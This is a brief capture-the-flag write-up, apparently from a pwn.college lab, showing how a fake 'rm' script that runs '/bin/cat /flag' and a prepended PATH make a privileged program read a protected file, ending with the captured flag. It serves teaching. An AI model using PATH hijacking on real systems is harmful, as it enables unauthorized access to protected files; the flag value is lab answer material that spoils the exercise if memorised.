#**Pondering Path**

##**Hijacking Commands**

I passed _/bin/cat /flag_ to the shell script named rm to override the existing rm command and set PATH variable using export command. I ran _/challenge/run_ to get the flag.

    _hacker@path-hijacking-commands:~$ nano rm_

    _hacker@path-hijacking-commands:~$ chmod +x rm_

    _hacker@path-hijacking-commands:~$ export PATH=/home/hacker:$PATH_

    _hacker@path-hijacking-commands:~$ /challenge/run_

    _Trying to remove /flag..._

    _Found 'rm' command at /home/hacker/rm. Executing!_

    _pwn.college{4OTTYvM-A2YpCEUhyVE_9hl3S4x.ddzNyUDL1cTN0czW}_
